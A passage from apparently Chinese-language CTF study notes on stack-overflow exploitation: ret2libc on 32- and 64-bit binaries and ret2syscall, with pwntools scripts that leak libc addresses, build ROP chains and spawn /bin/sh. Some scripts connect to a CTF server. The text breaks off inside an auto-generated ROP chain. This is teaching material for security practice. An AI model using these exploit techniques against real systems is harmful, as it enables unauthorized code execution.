title="有sys，有shell"></a>有sys，有shell</h4><p>最简单的情况，直接调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_plt, b&#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="有sys，无shell"><a href="#有sys，无shell" class="headerlink" title="有sys，无shell"></a>有sys，无shell</h4><p>注意，往函数中输入参数时，32位是通过栈传递的，64位是通过寄存器传递的，32位函数地址在前，64位寄存器在前，函数在后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line"></span><br><span class="line">    [b&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(b&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="无sys，有shell"><a href="#无sys，有shell" class="headerlink" title="无sys，有shell"></a>无sys，有shell</h4><p>这里没有sys，那就不能直接拿他的地址了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adr_sys = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>因为我们代码里没有system函数</p><p><strong>PLT 表是按需生成的，它不是 <code>libc</code> 的完整目录。</strong></p><ul><li><p>在<strong>编译时</strong>，编译器会去检查你的 C 语言源码。</p></li><li><p>编译器<strong>只</strong>会为你源码里<strong>真正写出并调用过</strong>的外部函数，在 <code>.plt</code> 段生成对应的链接存根（Stub）。</p></li><li><p>也就是说，如果原程序的开发者在写代码时，只用了 <code>puts</code>、<code>read</code> 和 <code>printf</code>，<strong>根本没在代码里写过 <code>system(...)</code></strong>，那么编译出来的可执行文件里就<strong>绝对没有</strong> <code>system@plt</code>。</p></li></ul><p>如果你在 Pwntools 脚本里强行写 <code>elf.plt[&#39;system&#39;]</code>，Python 会当场给你报一个 <code>KeyError: &#39;system&#39;</code> 的红字错误，因为它在 ELF 文件的符号表里根本找不到这个玩意儿。</p><p><strong>步骤：</strong></p><p>libc里啥都有，直接去libc里拿sys函数地址就行（参考无sys，无shell），然后参数传shell</p><ul><li><p>寻找输出函数（如 <code>puts</code> 或 <code>write</code>）泄露某个 GOT 表项（比如 <code>__libc_start_main_got</code>）。</p></li><li><p>计算出 libc 基址，进而算出真实的 <code>system</code> 函数地址。</p></li><li><p>再次溢出时，<strong>直接把程序自带的 <code>/bin/sh</code> 地址作为参数</strong>传给算出来的 <code>system</code> 函数。 _(注：这和“无sys无shell”的步骤几乎一样，只是省去了去 libc 里找 <code>/bin/sh</code> 的那一步，直接就地取材。)</p></li></ul><h4 id="无sys，无shell"><a href="#无sys，无shell" class="headerlink" title="无sys，无shell"></a>无sys，无shell</h4><p><strong>步骤</strong></p><p>泄露 __libc_start_main 地址<br>获取 libc 版本(如果题目把libc附件给你了，就用strings libc.so | grep -i “release”获取版本)<br>获取 system 地址与 /bin/sh 的地址<br>再次执行源程序<br>触发栈溢出执行 system(‘/bin/sh’)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  <span class="comment">#总地址</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])<span class="comment">#当栈可直接溢出时，调用plt函数打印libc_start_main_got地址，然后返回main函数，但不可溢出时需借助格式化字符串等漏洞泄露libc_start_main_got地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get the related addr&quot;</span>)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><h4 id="有sys-有shell"><a href="#有sys-有shell" class="headerlink" title="有sys,有shell"></a>有sys,有shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *                                    </span><br><span class="line">elf=ELF(&#x27;./我把她丢了&#x27;)</span><br><span class="line">io = connect(&quot;gz.imxbt.cn&quot;,20666)            </span><br><span class="line"></span><br><span class="line">#adr_system=0x4004FC</span><br><span class="line"></span><br><span class="line">adr_system=elf.plt[&#x27;system&#x27;]         #sys_plt地址并不是ida中&quot;system&quot;字符串地址，是在PLT 会通过 GOT 去动态解析 libc 里的真正 system地址</span><br><span class="line"></span><br><span class="line">adr_shell=0x402008</span><br><span class="line">poprdi=0x401196</span><br><span class="line">ret=0x40101a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = b&#x27;a&#x27;*112+b&#x27;b&#x27;*8+p64(poprdi)+p64(adr_shell)+p64(ret)+p64(adr_system)  </span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()                    </span><br></pre></td></tr></table></figure><h4 id="有sys，无shell-1"><a href="#有sys，无shell-1" class="headerlink" title="有sys，无shell"></a>有sys，无shell</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有sys，无shell(64位)</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    </span><br><span class="line">elf=ELF(<span class="string">&#x27;./彻底失去她&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = connect(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20698</span>)             </span><br><span class="line"><span class="comment">#adr_system=0x4004FC</span></span><br><span class="line">adr_system=elf.plt[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(adr_system)</span><br><span class="line">adr_read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x4040A0</span></span><br><span class="line">pop_rdi=<span class="number">0x401196</span></span><br><span class="line">pop_rsi=<span class="number">0x4011ad</span> </span><br><span class="line">pop_rdx=<span class="number">0x401265</span></span><br><span class="line"></span><br><span class="line">payload  =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">0x20</span>)+p64(adr_read)+p64(pop_rdi)+p64(bss)+p64(adr_system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload) </span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()                    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="无sys，有shell-1"><a href="#无sys，有shell-1" class="headerlink" title="无sys，有shell"></a>无sys，有shell</h4><p>参考无sys，无shell</p><h4 id="无sys，无shell-1"><a href="#无sys，无shell-1" class="headerlink" title="无sys，无shell"></a>无sys，无shell</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = connect(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20742</span>)             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adr_main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">adr_puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">adr_libc_main=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>] <span class="comment">#给出的永远是 虚拟地址（程序 GOT 表项的地址），不是 libc 的真实函数地址。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adr_rdi=<span class="number">0x401176</span> </span><br><span class="line">adr_ret=<span class="number">0x40101a</span></span><br><span class="line">io.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">18</span>+p64(adr_rdi)+p64(adr_libc_main)+p64(adr_puts)+p64(adr_main) <span class="comment"># put的地址是小端序</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#adr_libc_main_ture=u64(io.recv()[-6:].ljust(8,b&#x27;\x00&#x27;))#在 64 位程序里，指针地址通常只有 低 6 个字节是有意义的</span></span><br><span class="line">adr_libc_main_ture=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#注意用第二种写法，但也不绝对，最好print(io.recv())看一下,ljust是在右边补0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(adr_libc_main_ture))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,adr_libc_main_ture) <span class="comment">#获取Libc版本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcbase=adr_libc_main_ture-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">adr_sys=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">adr_shell=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">18</span>+p64(adr_rdi)+p64(adr_shell)+p64(ret)+p64(adr_sys)<span class="comment">#为什么要加ret呢,为了处理栈平衡，否则会崩溃.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload) </span><br><span class="line">io.interactive()                   </span><br></pre></td></tr></table></figure><h2 id="Ret2syscall"><a href="#Ret2syscall" class="headerlink" title="Ret2syscall"></a>Ret2syscall</h2><p>这里面就没有plt表和got表了，不能借助libc的力量了</p><h3 id="小tips："><a href="#小tips：" class="headerlink" title="小tips："></a>小tips：</h3><ul><li><p>没有完整的/bin/sh，但有’sh’，可以用sh，但别用’/sh’</p><ul><li><p>调用 <code>system(&quot;sh&quot;)</code> 时，系统会去你环境变量的 <code>PATH</code> 路径（比如 <code>/bin</code>, <code>/usr/bin</code> 等）里去搜索名字叫 <code>sh</code> 的程序。它能顺利找到 <code>/bin/sh</code> 并执行，所以你能拿到 Shell。</p></li><li><p><strong>用 <code>&#39;/sh&#39;</code> 绝对不行</strong> 加上了前面的斜杠 <code>/</code>，这就变成了一个<strong>绝对路径</strong>。当你调用 <code>system(&quot;/sh&quot;)</code> 时，系统会严格按照你的指示，去 Linux 的根目录（<code>/</code>）下面找一个名字叫 <code>sh</code> 的文件。很显然，根目录下没有这个文件，程序会直接报错 “No such file or directory”</p></li></ul></li><li><p>使用 p32(adr_system) + p32(0) + p32(str_binsh) 来构造rop链执行<code>system(&quot;\bin\sh&quot;)</code> 需要加p32(0) 来伪造返回地址<br>是因为你直接跳到了 system 函数，它执行完后会 ret，所以你必须手动提供返回地址；（只有sys_plt和shell地址，没有调用call system）<br>使用 call system gadget 的话，它自动 push eip（返回地址）并跳转到 system，因此你不需要提供伪返回地址，参数直接跟上就行。</p></li></ul><h3 id="考点一：最理想状态：没sys有shell"><a href="#考点一：最理想状态：没sys有shell" class="headerlink" title="考点一：最理想状态：没sys有shell"></a>考点一：最理想状态：没sys有shell</h3><ul><li><p><strong>特征：</strong> 静态编译程序，且没开沙盒。存在完整的 <code>/bin/sh</code> 字符串，且各种 <code>pop reg; ret</code> 的 Gadget 随便挑。</p></li><li><p><strong>解法：</strong> 这是送分题。直接按照系统调用规矩：32 位给 <code>eax</code>, <code>ebx</code>, <code>ecx</code>, <code>edx</code> 赋值并触发 <code>int 0x80</code>；64 位给 <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code> 赋值并触发 <code>syscall</code>。</p></li><li><p><strong>自动化杀器：</strong> 这种题甚至不需要手写代码，直接终端一把梭：<code>ROPgadget --binary ./pwn --ropchain</code>。</p></li></ul><p>普通exp：(无sys有/bin/sh)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])  <span class="comment">#32位下execve在syscall下的调用号是0xb，64位下调用号是59</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>自动化生成payload：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419484</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000044a5e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043d350</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000044a5e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401f2f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000047f2eb</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043d350</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 